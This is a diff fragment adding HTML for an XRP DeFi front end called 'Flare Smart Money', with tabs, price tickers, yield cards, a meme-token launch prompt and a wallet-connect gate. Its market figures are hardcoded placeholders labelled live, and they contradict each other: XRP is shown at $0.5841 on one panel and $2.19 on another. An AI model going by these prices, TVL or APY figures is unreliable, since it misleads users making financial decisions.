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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div>
+      <div><span class="ln">Flare Smart Money</span><span class="ls">XRPFi · Built on Flare</span></div>
+    </div>
+    <div class="xrp-badge"><div class="xdot"></div>XRPFi Live</div>
+  </div>
+
+  <!-- NAV TABS -->
+  <div class="ntabs">
+    <button class="nt on" onclick="gp('home',this)"><span class="ic">⬡</span>Home</button>
+    <button class="nt" onclick="gp('dash',this)"><span class="ic">📊</span>Portfolio</button>
+    <button class="nt" onclick="gp('xrpfi',this)"><span class="ic">🔵</span>XRPFi</button>
+    <button class="nt" onclick="gp('yield',this)"><span class="ic">◈</span>Yield</button>
+    <button class="nt" onclick="gp('rewards',this)"><span class="ic">🪂</span>Rewards</button>
+    <button class="nt" onclick="gp('bot',this)"><span class="ic">◎</span>AI Bot</button>
+    <button class="nt" onclick="gp('meme',this)"><span class="ic">🚀</span>Meme</button>
+  </div>
+
+  <div class="main">
+
+    <!-- HOME -->
+    <div class="pnl on" id="p-home">
+      <div class="xstrip">
+        <div class="xs-top">
+          <div><div class="xs-lbl">Earn yield with XRP on Flare</div><div class="xs-val">132.8M XRP</div><div class="xs-sub">$77.6M USD total value locked</div></div>
+          <button class="xs-btn" onclick="gp('xrpfi',document.querySelectorAll('.nt')[2])">Launch XRPFi ↗</button>
+        </div>
+        <div class="xs-stats">
+          <div class="xs-s"><div class="xs-sv">$0.5841</div><div class="xs-sl">XRP Price</div></div>
+          <div class="xs-s"><div class="xs-sv">28.4%</div><div class="xs-sl">Peak APY</div></div>
+          <div class="xs-s"><div class="xs-sv">100</div><div class="xs-sl">Data Providers</div></div>
+        </div>
+      </div>
+
+      <div class="ticker">
+        <div class="t-icon">XRP</div>
+        <div><div class="t-price">$0.5841</div><div class="t-chg">▲ +4.2% (24h)</div></div>
+        <div class="t-right"><div class="t-mcap">$32.1B Mkt Cap</div><div class="t-vol">Vol: $2.4B · 24h</div></div>
+      </div>
+
+      <div style="background:linear-gradient(160deg,#fff 0%,var(--fl) 60%,#FFE6EC 100%);border:1px solid var(--fbc);border-radius:14px;padding:18px;margin-bottom:13px;text-align:center;position:relative;overflow:hidden;">
+        <div style="position:absolute;width:180px;height:180px;border-radius:50%;background:var(--fr);filter:blur(60px);opacity:.06;top:-50px;right:-40px;"></div>
+        <div style="width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,#E8234A,#b91c1c);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;overflow:hidden;padding:6px;"><img src="data:image/png;base64,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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div>
+        <div style="font-size:18px;font-weight:400;letter-spacing:-.02em;line-height:1.15;margin-bottom:7px;color:var(--fd);">XRPFi on <span style="color:var(--fr);">Flare</span></div>
+        <div style="font-size:12px;color:var(--fg);line-height:1.6;margin-bottom:14px;max-width:280px;margin-left:auto;margin-right:auto;">Use your XRP in DeFi — earn yield, stake, lend, and access FAssets. Powered by Flare's enshrined data protocols.</div>
+        <button onclick="gp('xrpfi',document.querySelectorAll('.nt')[2])" style="display:inline-flex;align-items:center;gap:6px;background:var(--fr);color:#fff;padding:11px 24px;border-radius:10px;border:none;cursor:pointer;font-size:13px;font-weight:600;transition:opacity .2s;">Start Earning with XRP →</button>
+      </div>
+
+      <div class="slbl">FAssets — XRP on Flare</div>
+      <div class="plbl">New Use Cases</div>
+      <div class="proto xhov" onclick="showWalletModal()" style="cursor:pointer;"><div class="pic xb" style="background:var(--xrpdim);">⬡</div><div><div class="ptit xc">FXRP →</div><div class="pdesc">Mint FXRP — an XRP-backed FAsset that lives on Flare and earns DeFi yields</div></div></div>
+      <div class="plbl">Enshrined Data Protocols</div>
+      <div class="proto xhov" onclick="showWalletModal()" style="cursor:pointer;"><div class="pic xb" style="background:var(--xrpdim);">◎</div><div><div class="ptit xc">FDC — XRP Oracle →</div><div class="pdesc">Real-time XRP price feeds secured by 100 decentralized data providers</div></div></div>
+      <div class="proto xhov" onclick="showWalletModal()" style="cursor:pointer;"><div class="pic xb" style="background:var(--xrpdim);">👁</div><div><div class="ptit xc">FTSO — XRP Price Feed →</div><div class="pdesc">Decentralized, manipulation-resistant XRP price data on-chain</div></div></div>
+
+      <div class="card" style="margin-top:13px;text-align:center;">
+        <div class="ftag">Decentralized XRP Data</div>
+        <div class="orb-w"><div class="orb"></div></div>
+        <div class="ostat"><div class="on2">100 XRP Data Providers</div><div class="ol">3.3% max stake · Flare Network</div></div>
+      </div>
+
+      <div class="slbl" style="margin-top:13px;">Participate with XRP</div>
+      <div class="pgrid">
+        <div class="pcard" onclick="gp('xrpfi',document.querySelectorAll('.nt')[2])"><div class="pic2">🔵</div><div class="ptit2">Mint FXRP →</div><div class="pdesc2">Turn XRP into a DeFi-ready FAsset</div></div>
+        <div class="pcard" onclick="gp('yield',document.querySelectorAll('.nt')[3])"><div class="pic2">◈</div><div class="ptit2">XRP Yield →</div><div class="pdesc2">LP pools, staking and farming</div></div>
+        <div class="pcard" onclick="gp('rewards',document.querySelectorAll('.nt')[4])"><div class="pic2">🪂</div><div class="ptit2">FlareDrops →</div><div class="pdesc2">Wrap FLR, earn XRP rewards</div></div>
+        <div class="pcard" onclick="gp('bot',document.querySelectorAll('.nt')[5])"><div class="pic2">◎</div><div class="ptit2">XRP AI Bot →</div><div class="pdesc2">Smart Money assistant for XRP</div></div>
+      </div>
+    </div>
+
+    <!-- PORTFOLIO -->
+    <div class="pnl" id="p-dash">
+
+      <!-- LIVE XRP MARKET STRIP — always visible -->
+      <div class="ticker" style="margin-bottom:13px;">
+        <div class="t-icon">XRP</div>
+        <div>
+          <div class="t-price" id="live-xrp-price">$2.19</div>
+          <div class="t-chg" id="live-xrp-chg">▲ +3.14% (24h)</div>
+        </div>
+        <div class="t-right">
+          <div class="t-mcap" id="live-xrp-mcap">Mkt Cap $128.4B</div>
+          <div class="t-vol" id="live-xrp-vol">Vol: $4.8B · 24h</div>
+        </div>
+      </div>
+
+      <!-- FXRP live rate — always visible -->
+      <div style="background:var(--xrplight);border:1px solid rgba(52,106,169,.18);border-radius:12px;padding:10px 14px;margin-bottom:13px;display:flex;align-items:center;justify-content:space-between;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <div style="width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#346AA9,#1a4a7a);display:flex;align-items:center;justify-content:center;color:#fff;font-size:9px;font-weight:700;">FX</div>
+          <div><div style="font-size:12px;font-weight:600;color:var(--xrp);">FXRP</div><div style="font-size:10px;color:var(--fg);">XRP FAsset · 1:1 peg</div></div>
+        </div>
+        <div style="text-align:right;">
+          <div style="font-size:13px;font-weight:700;color:var(--xrp);" id="live-fxrp-price">$2.19</div>
+          <div style="font-size:10px;color:var(--green);">TVL $77.6M · 28.4% APY</div>
+        </div>
+      </div>
+
+      <!-- Launch Meme Token CTA — always visible -->
+      <div onclick="gp('meme',document.querySelectorAll('.nt')[6])" style="background:linear-gradient(135deg,#0f172a,#1e293b);border-radius:13px;padding:13px 15px;margin-bottom:13px;display:flex;align-items:center;gap:12px;cursor:pointer;border:1px solid rgba(255,255,255,0.08);position:relative;overflow:hidden;transition:opacity .2s;">
+        <div style="position:absolute;inset:0;background:radial-gradient(circle at 80% 50%,rgba(249,115,22,0.12),transparent);"></div>
+        <div style="width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#f97316,#E8234A);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;z-index:1;">🚀</div>
+        <div style="z-index:1;"><div style="font-size:13px;font-weight:600;color:#fff;margin-bottom:2px;">Launch XRP Meme Token</div><div style="font-size:10px;color:rgba(255,255,255,0.55);">Create & deploy your XRP meme token on Flare</div></div>
+        <div style="margin-left:auto;z-index:1;display:flex;align-items:center;gap:5px;padding:5px 11px;background:linear-gradient(135deg,#f97316,#E8234A);border-radius:20px;font-size:10px;font-weight:600;color:#fff;white-space:nowrap;">Launch →</div>
+      </div>
+
+      <!-- ── WALLET NOT CONNECTED STATE ── -->
+      <div id="wallet-gate">
+        <!-- Blurred / locked metrics -->
+        <div style="position:relative;margin-bottom:13px;">
+          <div class="mets" style="filter:blur(5px);pointer-events:none;user-select:none;">
+            <div class="mc xacc"><div class="ml">XRP Holdings</div><div class="mv" style="color:var(--xrp);">••••</div><div class="mch" style="color:var(--xrp);">$•,•••</div></div>
+            <div class="mc xacc"><div class="ml">FXRP Minted</div><div class="mv" style="color:var(--xrp);">••••</div><div class="mch up">••••</div></div>
+            <div class="mc acc"><div class="ml">XRP Yield/mo</div><div class="mv up">$•••</div><div class="mch up">◈ ••••</div></div>
+            <div class="mc acc"><div class="ml">Claimable</div><div class="mv" style="color:var(--fr);">$••.••</div><div class="mch" style="color:var(--fr);">••••</div></div>
+          </div>
+          <!-- Lock overlay on metrics -->
+          <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
+            <div style="background:rgba(255,255,255,0.92);border:1px solid var(--fbc);border-radius:10px;padding:5px 14px;font-size:11px;font-weight:600;color:var(--fg);display:flex;align-items:center;gap:5px;">🔒 Connect wallet to view</div>
+          </div>
+        </div>
+
+        <!-- Connect Wallet CTA card -->
+        <div style="background:linear-gradient(135deg,#fff,var(--xrplight));border:1.5px dashed rgba(52,106,169,.3);border-radius:16px;padding:22px 16px;text-align:center;margin-bottom:13px;">
+          <div style="font-size:34px;margin-bottom:10px;">🔗</div>
+          <div style="font-size:15px;font-weight:600;color:var(--fd);margin-bottom:5px;">Connect Your Wallet</div>
